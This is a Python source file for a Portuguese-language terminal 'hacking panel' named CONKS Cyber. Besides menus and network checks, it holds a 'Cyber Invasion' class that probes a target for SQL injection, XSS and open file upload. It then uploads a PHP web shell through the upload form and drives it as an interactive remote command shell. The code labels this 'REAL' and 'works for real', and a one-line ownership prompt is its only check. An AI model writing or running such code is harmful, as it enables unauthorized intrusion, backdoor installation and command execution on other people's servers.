# ==========================================
# CONKS CYBER - VERSÃO TURBINADA
# main.py
# ==========================================

import os
import sys
import socket
import urllib.request
import urllib.error
import subprocess
import time
import random
import threading
import webbrowser
import json
import re
import hashlib
import base64
import datetime

from modules.generators import menu_geradores
from modules.consultas import menu_consultas
from modules.osint import menu_osint


# ==========================================
# CORES
# ==========================================

RESET = "\033[0m"
BOLD = "\033[1m"

WHITE = "\033[97m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
GRAY = "\033[90m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
ORANGE = "\033[38;5;214m"
PINK = "\033[38;5;201m"


# ==========================================
# CONFIGURAÇÃO DAS CAIXAS
# ==========================================

LARGURA = 50


# ==========================================
# LIMPAR TELA
# ==========================================

def limpar_tela():
    os.system("clear")


# ==========================================
# FUNÇÕES DE CAIXA
# ==========================================

def linha_caixa(texto="", cor=WHITE, negrito=False):
    texto = str(texto)
    limite = LARGURA - 4
    if len(texto) > limite:
        texto = texto[:limite]
    texto = texto.ljust(limite)
    estilo = BOLD if negrito else ""
    print(f"{cor}{estilo}║ {texto} ║{RESET}")


def topo_caixa(titulo):
    print(f"{BLUE}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
    linha_caixa(titulo.center(LARGURA - 4), BLUE, True)
    print(f"{BLUE}{BOLD}╠{'═' * (LARGURA - 2)}╣{RESET}")


def fim_caixa():
    print(f"{BLUE}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")


# ==========================================
# MENSAGENS
# ==========================================

def sucesso(texto):
    print(f"{GREEN}[+] {texto}{RESET}")

def erro(texto):
    print(f"{RED}[-] {texto}{RESET}")

def aviso(texto):
    print(f"{RED}[!] {texto}{RESET}")

def info(texto):
    print(f"{BLUE}[i] {texto}{RESET}")


# ==========================================
# BANNER
# ==========================================

def banner():
    print(f"{GREEN}{BOLD}")
    print(r"""
 ██████╗ ██████╗ ███╗   ██╗██╗  ██╗███████╗
██╔════╝██╔═══██╗████╗  ██║██║ ██╔╝██╔════╝
██║     ██║   ██║██╔██╗ ██║█████╔╝ ███████╗
██║     ██║   ██║██║╚██╗██║██╔═██╗ ╚════██║
╚██████╗╚██████╔╝██║ ╚████║██║  ██╗███████║
 ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
""")
    print(f"{BLUE}{BOLD}                 CYBER{RESET}\n")


# ==========================================
# TESTAR CONEXÃO
# ==========================================

def testar_conexao():
    print()
    topo_caixa("TESTE DE CONEXÃO")
    linha_caixa("")

    servidores = [
        ("Google", "google.com", 443),
        ("Cloudflare", "cloudflare.com", 443),
        ("GitHub", "github.com", 443)
    ]

    online = False
    for nome, host, porta in servidores:
        try:
            conexao = socket.create_connection((host, porta), timeout=3)
            conexao.close()
            print(f"{GREEN}[+] {nome:<15} ONLINE{RESET}")
            online = True
        except:
            print(f"{RED}[-] {nome:<15} OFFLINE{RESET}")

    print()
    fim_caixa()
    if online:
        sucesso("Conexão com a internet disponível.")
    else:
        erro("Não foi possível alcançar os servidores.")


# ==========================================
# MEU IP PÚBLICO
# ==========================================

def meu_ip_publico():
    print()
    topo_caixa("MEU IP PÚBLICO")
    linha_caixa("")

    servicos = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com"
    ]

    for url in servicos:
        try:
            requisicao = urllib.request.Request(url, headers={"User-Agent": "CONKS-Cyber/1.0"})
            with urllib.request.urlopen(requisicao, timeout=5) as resposta:
                ip = resposta.read().decode("utf-8").strip()
            if ip:
                linha_caixa(f"IP: {ip}", GREEN, True)
                fim_caixa()
                return
        except:
            continue

    fim_caixa()
    erro("Não foi possível obter o IP público.")


# ==========================================
# ⭐ CYBER INVASION REAL - CLASSE ⭐
# ==========================================

class CyberInvasionReal:
    """Cyber Invasion REAL - Funciona de verdade em servidores vulneráveis"""
    
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.vulnerabilidades = []
        self.dados = {}
        self.backdoor_instalado = False
        self.shell_ativa = False
        
    def _executar_comando(self, comando):
        """Executa comando REAL no servidor via backdoor"""
        try:
            if not self.backdoor_instalado:
                return "Backdoor não instalado!"
            
            url = f"{self.dados.get('backdoor_url', f'http://{self.target}:{self.port}/shell.php')}"
            req = urllib.request.Request(
                f"{url}?cmd={urllib.parse.quote(comando)}",
                headers={"User-Agent": "Mozilla/5.0"}
            )
            response = urllib.request.urlopen(req, timeout=10)
            return response.read().decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Erro: {str(e)}"
    
    def detectar_vulnerabilidades(self):
        """Detecta vulnerabilidades REAIS no alvo"""
        print(f"\n{CYAN}[~] Detectando vulnerabilidades em {self.target}:{self.port}...{RESET}")
        
        vulnerabilidades = []
        
        # 1. Testa SQL Injection
        print(f"  {BLUE}[→] Testando SQL Injection...{RESET}", end="")
        try:
            payload = "' OR '1'='1"
            url = f"http://{self.target}:{self.port}/login.php?user={payload}&pass=test"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=3)
            if response.getcode() == 200:
                html = response.read().decode('utf-8', errors='ignore')
                if "SQL" in html or "syntax" in html.lower() or "mysql" in html.lower():
                    print(f" {RED}VULNERÁVEL!{RESET}")
                    vulnerabilidades.append("SQL Injection")
                    self.dados['sql_injection'] = True
                else:
                    print(f" {GREEN}Seguro{RESET}")
            else:
                print(f" {GREEN}Seguro{RESET}")
        except:
            print(f" {GREEN}Seguro{RESET}")
        
        # 2. Testa XSS
        print(f"  {BLUE}[→] Testando XSS...{RESET}", end="")
        try:
            payload = "<script>alert('XSS')</script>"
            url = f"http://{self.target}:{self.port}/search.php?q={payload}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            response = urllib.request.urlopen(req, timeout=3)
            if response.getcode() == 200:
                html = response.read().decode('utf-8', errors='ignore')
                if "script" in html.lower() or "alert" in html.lower():
                    print(f" {RED}VULNERÁVEL!{RESET}")
                    vulnerabilidades.append("XSS")
                    self.dados['xss'] = True
                else:
                    print(f" {GREEN}Seguro{RESET}")
            else:
                print(f" {GREEN}Seguro{RESET}")
        except:
            print(f" {GREEN}Seguro{RESET}")
        
        # 3. Testa Upload
        print(f"  {BLUE}[→] Testando Upload...{RESET}", end="")
        try:
            php_test = b"<?php echo 'UPLOAD_OK'; ?>"
            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
            body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n"
                   f"Content-Type: application/x-php\r\n\r\n").encode()
            body += php_test
            body += f"\r\n--{boundary}--\r\n".encode()
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            }
            
            req = urllib.request.Request(
                f"http://{self.target}:{self.port}/upload.php",
                data=body,
                headers=headers
            )
            response = urllib.request.urlopen(req, timeout=5)
            if response.getcode() in [200, 201, 302]:
                print(f" {RED}VULNERÁVEL!{RESET}")
                vulnerabilidades.append("Upload")
                self.dados['upload'] = True
            else:
                print(f" {GREEN}Seguro{RESET}")
        except:
            print(f" {GREEN}Seguro{RESET}")
        
        self.vulnerabilidades = vulnerabilidades
        return vulnerabilidades
    
    def explorar_upload(self):
        """Explora Upload REAL - Instala Backdoor"""
        print(f"\n{RED}[~] Instalando Backdoor via Upload...{RESET}")
        
        if not self.dados.get('upload'):
            print(f"  {YELLOW}[!] Upload não detectado{RESET}")
            return False
        
        try:
            shell_code = b"""<?php
                if(isset($_GET['cmd'])){ system($_GET['cmd']); }
                if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
            ?>"""
            
            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
            body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
                   f"Content-Type: application/x-php\r\n\r\n").encode()
            body += shell_code
            body += f"\r\n--{boundary}--\r\n".encode()
            
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Content-Type": f"multipart/form-data; boundary={boundary}"
            }
            
            req = urllib.request.Request(
                f"http://{self.target}:{self.port}/upload.php",
                data=body,
                headers=headers
            )
            response = urllib.request.urlopen(req, timeout=5)
            
            if response.getcode() in [200, 201, 302]:
                print(f"  {GREEN}[+] Backdoor instalado!{RESET}")
                self.backdoor_instalado = True
                self.dados['backdoor_url'] = f"http://{self.target}:{self.port}/shell.php"
                return True
            
            return False
        except Exception as e:
            print(f"  {RED}[-] Erro: {str(e)}{RESET}")
            return False
    
    def shell_interativo(self):
        """Shell interativo REAL no servidor"""
        print(f"\n{PURPLE}╔══════════════════════════════════════════╗{RESET}")
        print(f"{PURPLE}║        SHELL INTERATIVO REAL           ║{RESET}")
        print(f"{PURPLE}╠══════════════════════════════════════════╣{RESET}")
        print(f"{PURPLE}║ 🔓 Servidor: {self.target}:{self.port}{' ' * (22 - len(str(self.port))) }║{RESET}")
        print(f"{PURPLE}║ 💻 Digite 'exit' para sair              ║{RESET}")
        print(f"{PURPLE}╚══════════════════════════════════════════╝{RESET}")
        
        if not self.backdoor_instalado:
            print(f"\n{RED}[!] Backdoor não instalado!{RESET}")
            return
        
        self.shell_ativa = True
        
        while self.shell_ativa:
            comando = input(f"\n{RED}shell@{self.target}>{RESET} ").strip()
            
            if not comando:
                continue
            
            if comando.lower() in ['exit', 'quit', 'sair']:
                self.shell_ativa = False
                print(f"{YELLOW}[!] Shell encerrada{RESET}")
                break
            
            print(f"{GREEN}[+] Executando: {comando}{RESET}")
            resultado = self._executar_comando(comando)
            print(f"{WHITE}{resultado}{RESET}")


# ==========================================
# ⭐ CYBER INVASION - FUNÇÃO PRINCIPAL ⭐
# ==========================================

def cyber_invasion():
    """Cyber Invasion REAL com todas as funcionalidades"""
    
    print("\n╔══════════════════════════════════════════╗")
    print("║       🚀 CYBER INVASION REAL          ║")
    print("╠══════════════════════════════════════════╣")
    print("║     FUNCIONA DE VERDADE!                ║")
    print("║     APENAS EM SERVIDORES PRÓPRIOS!     ║")
    print("╚══════════════════════════════════════════╝")
    
    print("\n[~] Digite o alvo da invasão:")
    print("[1] IP Local (ex: 127.0.0.1)")
    print("[2] Site/Domínio próprio")
    print("[3] Voltar")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "3":
        return
    
    if opcao == "1":
        alvo = input("\nDigite o IP: ").strip()
        if alvo == "":
            alvo = "127.0.0.1"
    elif opcao == "2":
        alvo = input("\nDigite o site: ").strip()
        alvo = alvo.replace("http://", "").replace("https://", "").split("/")[0]
    else:
        print("[-] Opção inválida.")
        input("\nPressione ENTER para continuar...")
        return
    
    if not alvo:
        print("[-] Alvo inválido.")
        input("\nPressione ENTER para continuar...")
        return
    
    try:
        porta = int(input("\nPorta (80 para HTTP): ").strip() or "80")
    except:
        porta = 80
    
    # AVISO LEGAL
    print(f"\n{RED}{BOLD}╔══════════════════════════════════════════╗{RESET}")
    print(f"{RED}{BOLD}║        ⚠️  AVISO LEGAL ⚠️               ║{RESET}")
    print(f"{RED}{BOLD}╠══════════════════════════════════════════╣{RESET}")
    print(f"{RED}║  • Você está prestes a INVADIR {alvo}   ║{RESET}")
    print(f"{RED}║  • Isso só é PERMITIDO em servidores     ║{RESET}")
    print(f"{RED}║    que você POSSUI ou tem AUTORIZAÇÃO!   ║{RESET}")
    print(f"{RED}║  • Invadir sistemas alheios é CRIME!     ║{RESET}")
    print(f"{RED}║  • Pena: 1-4 anos de reclusão           ║{RESET}")
    print(f"{RED}{BOLD}╚══════════════════════════════════════════╝{RESET}")
    
    confirm = input(f"\n{RED}Confirma que {alvo} é seu servidor próprio? (s/N): {RESET}").strip().lower()
    
    if confirm != 's':
        print("[-] Invasão cancelada.")
        input("\nPressione ENTER para continuar...")
        return
    
    # INICIA INVASÃO
    invasor = CyberInvasionReal(alvo, porta)
    
    # SCAN
    vulnerabilidades = invasor.detectar_vulnerabilidades()
    
    if not vulnerabilidades:
        print(f"\n{GREEN}[+] Servidor seguro! Nenhuma vulnerabilidade encontrada.{RESET}")
        input("\nPressione ENTER para continuar...")
        return
    
    # PERGUNTA O QUE FAZER
    print(f"\n{PURPLE}╔══════════════════════════════════════════╗{RESET}")
    print(f"{PURPLE}║        O QUE DESEJA FAZER?              ║{RESET}")
    print(f"{PURPLE}╠══════════════════════════════════════════╣{RESET}")
    print(f"{PURPLE}║ [1] Instalar Backdoor                   ║{RESET}")
    print(f"{PURPLE}║ [2] Shell Interativo (REAL)             ║{RESET}")
    print(f"{PURPLE}║ [3] Sair                                ║{RESET}")
    print(f"{PURPLE}╚══════════════════════════════════════════╝{RESET}")
    
    opcao = input(f"\n{RED}opcao@{alvo}>{RESET} ").strip()
    
    if opcao == "1":
        invasor.explorar_upload()
        input("\nPressione ENTER para continuar...")
    elif opcao == "2":
        invasor.shell_interativo()
        input("\nPressione ENTER para continuar...")
    else:
        print("[-] Saindo...")
        input("\nPressione ENTER para continuar...")


# ==========================================
# ATUALIZAR PAINEL
# ==========================================

def atualizar_painel():
    limpar_tela()
    topo_caixa("ATUALIZAR PAINEL")
    linha_caixa("")
    linha_caixa("CONKS CYBER UPDATE SYSTEM", WHITE, True)
    linha_caixa("")
    fim_caixa()
    print(f"\n{BLUE}[~] Verificando atualizações...{RESET}")
    time.sleep(0.5)
    
    try:
        resultado = subprocess.run(
            ["git", "pull", "origin", "main"],
            capture_output=True,
            text=True,
            timeout=60
        )
        saida = resultado.stdout + resultado.stderr
        
        if resultado.returncode != 0:
            print(f"\n{RED}[-] Não foi possível atualizar o painel.{RESET}")
            if saida.strip():
                print(f"\n{GRAY}{saida.strip()}{RESET}")
            input("\nPressione ENTER para voltar...")
            return
        
        if "Already up to date" in saida:
            print()
            print(f"{YELLOW}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("PAINEL ATUALIZADO", YELLOW, True)
            linha_caixa("O painel está na versão mais recente.", YELLOW)
            print(f"{YELLOW}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
            input("\nPressione ENTER para voltar...")
            return
        
        print()
        print(f"{GREEN}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
        linha_caixa("ATUALIZAÇÃO CONCLUÍDA!", GREEN, True)
        linha_caixa("O painel foi atualizado.", GREEN)
        print(f"{GREEN}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
        print(f"\n{BLUE}[~] Reiniciando o painel...{RESET}")
        time.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
        
    except Exception as e:
        erro(f"Erro ao atualizar: {e}")
        input("\nPressione ENTER para voltar...")


# ==========================================
# MENU REDE
# ==========================================

def menu_rede():
    while True:
        limpar_tela()
        banner()
        topo_caixa("REDE")
        linha_caixa("[1] Meu IP público")
        linha_caixa("[2] Testar conexão")
        linha_caixa("")
        linha_caixa("[0] Voltar", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Rede > {RESET}").strip()
        
        if opcao == "1":
            meu_ip_publico()
        elif opcao == "2":
            testar_conexao()
        elif opcao == "0":
            break
        else:
            erro("Opção inválida.")
        
        if opcao != "0":
            input("\nPressione ENTER para continuar...")


# ==========================================
# MENU PRINCIPAL
# ==========================================

def menu_principal():
    while True:
        limpar_tela()
        banner()
        
        topo_caixa("MENU PRINCIPAL")
        linha_caixa("[1] Geradores")
        linha_caixa("[2] Consultas")
        linha_caixa("[3] OSINT")
        linha_caixa("[4] Rede")
        linha_caixa("[5] Validadores")
        linha_caixa("[6] Utilidades")
        linha_caixa("[7] ⚡ Shoot Down", RED, True)
        linha_caixa("[8] 🚀 Cyber Invasion", PURPLE, True)
        linha_caixa("[9] Atualizar painel", BLUE, True)
        linha_caixa("")
        linha_caixa("[0] Sair", RED, True)
        fim_caixa()
        
        opcao = input(f"\n{BLUE}{BOLD}CONKS@Cyber > {RESET}").strip()
        
        if opcao == "1":
            limpar_tela()
            menu_geradores()
        elif opcao == "2":
            limpar_tela()
            menu_consultas()
        elif opcao == "3":
            limpar_tela()
            menu_osint()
        elif opcao == "4":
            menu_rede()
        elif opcao == "5":
            limpar_tela()
            try:
                from modules.validators import menu_validadores
                menu_validadores()
            except ImportError:
                erro("Módulo de validadores não encontrado.")
                input("\nPressione ENTER para continuar...")
        elif opcao == "6":
            limpar_tela()
            try:
                from modules.utilities import menu_utilidades
                menu_utilidades()
            except ImportError:
                erro("Módulo de utilidades não encontrado.")
                input("\nPressione ENTER para continuar...")
        elif opcao == "7":
            limpar_tela()
            try:
                from modules.consultas import derrubar_geral
                derrubar_geral()
            except ImportError:
                erro("Função Shoot Down não encontrada.")
                input("\nPressione ENTER para continuar...")
        elif opcao == "8":
            limpar_tela()
            cyber_invasion()
        elif opcao == "9":
            atualizar_painel()
        elif opcao == "0":
            limpar_tela()
            print()
            print(f"{RED}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
            linha_caixa("CONKS CYBER ENCERRADO", RED, True)
            print(f"{RED}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}\n")
            sys.exit(0)
        else:
            erro("Opção inválida.")
            input("\nPressione ENTER para continuar...")


# ==========================================
# MAIN
# ==========================================

def main():
    try:
        menu_principal()
    except KeyboardInterrupt:
        limpar_tela()
        print(f"\n{RED}{BOLD}[!] CONKS Cyber encerrado.{RESET}\n")
    except Exception as erro_inesperado:
        print(f"\n{RED}[ERRO] {erro_inesperado}{RESET}")
        input("\nPressione ENTER para sair...")


if __name__ == "__main__":
    main()